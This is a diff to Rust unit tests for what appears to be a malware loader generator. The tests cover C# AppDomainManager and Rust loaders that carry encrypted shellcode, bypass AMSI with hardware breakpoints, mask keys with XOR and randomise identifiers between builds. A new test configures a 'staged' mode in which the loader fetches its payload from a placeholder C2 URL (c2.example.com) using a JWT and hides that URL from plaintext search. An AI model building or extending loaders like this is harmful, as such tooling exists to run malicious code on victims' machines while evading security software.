@@ -19,6 +19,7 @@ fn test_appdomain_csharp_renders() {
         }),
         wsf_stub_config: None,
         dotnet_stub_hex: None,
+        staged: None,
     };
     let src = generate_csharp_source(&config).unwrap();
     assert!(src.contains("AppDomainManager"), "missing AppDomainManager base class");
@@ -49,6 +50,7 @@ fn test_appdomain_two_builds_produce_different_identifiers() {
         }),
         wsf_stub_config: None,
         dotnet_stub_hex: None,
+        staged: None,
     };
     let src1 = generate_csharp_source(&config).unwrap();
     let src2 = generate_csharp_source(&config).unwrap();
@@ -70,6 +72,7 @@ fn test_binary_template_generates_valid_rust() {
         appdomain_config: None,
         wsf_stub_config: None,
         dotnet_stub_hex: None,
+        staged: None,
     };
     let source = generate_loader_source(&config).unwrap();
 
@@ -99,6 +102,7 @@ fn test_binary_key_is_masked() {
         appdomain_config: None,
         wsf_stub_config: None,
         dotnet_stub_hex: None,
+        staged: None,
     };
     let source = generate_loader_source(&config).unwrap();
     // XOR unmask loop must appear
@@ -106,6 +110,38 @@ fn test_binary_key_is_masked() {
     // Five consecutive plain key bytes (170,170,170,170,170) must NOT appear
     assert!(!source.contains("170,170,170,170,170,"),
         "plain key bytes must not appear consecutively in source");
+}
+
+#[test]
+fn test_binary_staged_mode_uses_fetch() {
+    let config = LoaderConfig {
+        loader_type: LoaderType::Binary,
+        features: vec![Feature::AmsiHwbp],
+        encryption: Encryption::Aes256,
+        shellcode_hex: "00".into(),
+        key_hex: "00".repeat(32),
+        iv_hex:  "00".repeat(16),
+        pe_config: None,
+        appdomain_config: None,
+        wsf_stub_config: None,
+        dotnet_stub_hex: None,
+        staged: Some(StagedConfig {
+            url:        "https://c2.example.com/api/v1/stage/aabbccddeeff0011".into(),
+            jwt:        "AAA.BBB.CCC".into(),
+            user_agent: "Mozilla/5.0".into(),
+        }),
+    };
+    let src = generate_loader_source(&config).unwrap();
+    assert!(src.contains("scaffold::stager::fetch"),
+        "staged Rust binary must call scaffold::stager::fetch");
+    // The plaintext URL/JWT must NOT appear in the source
+    assert!(!src.contains("https://c2.example.com"),
+        "staged URL must be XOR-encoded, not plaintext");
+    assert!(!src.contains("AAA.BBB.CCC"),
+        "staged JWT must be XOR-encoded, not plaintext");
+    // The legacy shellcode literal must NOT appear in staged mode
+    assert!(!src.contains("decrypt_aes256"),
+        "staged mode must skip embedded shellcode decryption path");
 }
 
 #[test]
@@ -121,6 +157,7 @@ fn test_two_builds_produce_different_identifiers() {
         appdomain_config: None,
         wsf_stub_config: None,
         dotnet_stub_hex: None,
+        staged: None,
     };
     let source1 = generate_loader_source(&config).unwrap();
     let source2 = generate_loader_source(&config).unwrap();
